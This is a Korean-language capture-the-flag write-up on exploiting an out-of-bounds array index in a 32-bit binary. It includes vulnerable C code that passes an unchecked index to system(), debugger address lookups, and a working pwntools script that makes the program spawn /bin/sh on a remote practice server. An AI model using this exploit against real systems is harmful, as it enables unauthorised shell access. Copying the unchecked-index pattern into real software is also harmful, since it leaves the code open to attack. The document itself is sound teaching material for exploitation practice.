# Exploit Tech: Out of Bounds

# 들어가며

## 서론

---

x86, 즉 32비트의 아키텍쳐를 가지는 환경에서 배열의 임의 인덱스에 접근할 수 있는 취약점을 이용한 공격을 학습한다.

## 문제 목표 및 기능 요약

---

한 데이터 영역에 원하는 정보를 쓸 수 있고, 배열의 원하는 인덱스에 해당하는 주소에 해당하는 문자열을 실행시킬 수 있는 환경에서 익스플로잇을 한다.

# 분석 및 설계

## 분석

---

### 보호 기법

checksec을 사용하여 적용된 보호 기법을 파악한다.

```c
$ checksec out_of_bound
[*]
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

실습 환경에는 ASLR이 적용되어 있고, 바이너리에는 NX와 Canary가 적용되어 있다. PIE는 적용되지 않았다.

ASLR이 적용되어 있기 때문에 실행 시마다 스택, 라이브러리 등의 주소가 랜덤화되고, NX가 적용되어 있기 때문에 임의의 위치에 셸코드를 집어넣은 후 그 주소의 코드를 바로 실행시킬 수 없다. Canary가 적용되어 있기 때문에 스택 맨 위에 존재하는 SFP, RET과 그 뒷 주소를 마음대로 변경할 수 없다.

PIE가 적용되지 않기 때문에 해당 바이너리가 실행되는 메모리 주소가 랜덤화되지 않는다. 따라서 데이터 영역의 변수들은 항상 정해진 주소에 할당된다.

### 코드 분석

 

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = {
    "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

name 전역 변수에 16바이트까지 원하는 값을 넣을 수 있고, 기본적으로 “cat”, “ls”, “id”, “ps”, “file ./oob”의 5개의 명령어를 system함수를 통해 셸에서 실행시킨 결과를 얻을 수 있다. 그 결과만으로는 플래그를 읽을 수 없으므로, Out of bounds 취약점을 사용해 command[idx]에 “/bin/sh\x00”이 들어가게 해야한다.

# 익스플로잇

## 익스플로잇

---

다시 한번 코드를 살펴보자.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = {
    "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
    
...

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

idx의 범위는 0~4이지만, 프로그램 내부에서 idx의 범위에 대한 검사를 진행하지 않기 때문에, 다른 주소를 가져올 수 있다.

따라서 Out of Bound 취약점이 발생한다. 

### command와 name의 주소 확인

command와 name 전역 변수는 PIE가 꺼져 있기 때문에, 실행시마다 일정한 주소에 위치한다. pwndbg에서 각각의 주소를 확인해보자.

```c
pwndbg> p &command
$1 = (<data variable, no debug info> *) 0x804a060 <command>
pwndbg> p &name
$2 = (<data variable, no debug info> *) 0x804a0ac <name>
```

이때 p는 print의 약어로 GDB에서 표현식을 평가해서 결과를 출력하는 명령어이다.

p &command는 command 변수의 주소를 출력하라는 의미이다.
배열과 포인터에 대해서 동작이 다르다.

<aside>

p ptr    → 0x804a060   (ptr이 가리키는 주소)
p *ptr   → "cat"       (그 주소에 있는 값)
p &ptr   → 0x7fff1234  (ptr 변수 자체의 주소)

p arr    → "cat"        (배열 내용)
p *arr   → 99 'c'       (첫 번째 원소)
p &arr   → 0x804a060    (배열 시작 주소)

</aside>

i var 명령으로도 가능하다. info variables의 약어로 i var command 하여도 command의 주소를 구할 수 있다.

command는 0x804a060, name은 0x804a0ac로, 76바이트 만큼 차이가 난다.

이때 command는 char * 형으로 정의되어 있다. x86, 즉 32비트 환경에서 실행되는 바이너리이기 때문에 각 주소는 32비트, 또는 4바이트로 표현된다.

따라서 76 = 4 * 19이므로 command[19] = name이 된다.

### system 함수에 인자 전달

system 함수는 문자열의 주소를 전달받아야한다. 하지만 만약 name에 “/bin/sh\x00”을 넣게 되면 문자열의 주소를 받는 것이 아니라 문자열 자체를 받는게 되버린다. 따라서 name 변수에 “/bin/sh\x00” + (name 변수의 주소) 를 넣어 command[idx]가 name 변수의 주소를 가리키게 한다면 익스플로잇 할 수 있다.

### Payload 작성

name에 8바이트의 “/bin/sh\x00”을 넣은 후, 그 뒤에 pwntools의 p32 함수를 사용해 만든 0x804a0ac를 붙여 총 12바이트를 저장한다.

그렇게 되면 name + 8이 가지는 값이 0x804a0ac이 되게 되고, command[19 + 2] = *(name + 8) = 0x804a0ac의 값을 가지게 된다. system(0x804a0ac)을 실행하면 name에 있는 “/bin/sh\x00”을 실행시킬 수 있게 된다.

```c
from pwn import *

p = remote("host3.dreamhack.games", 18187)

payload = b"/bin/sh\x00" + p32(0x804a0ac)

p.sendline(payload)
p.sendline(b"21")

p.interactive()
```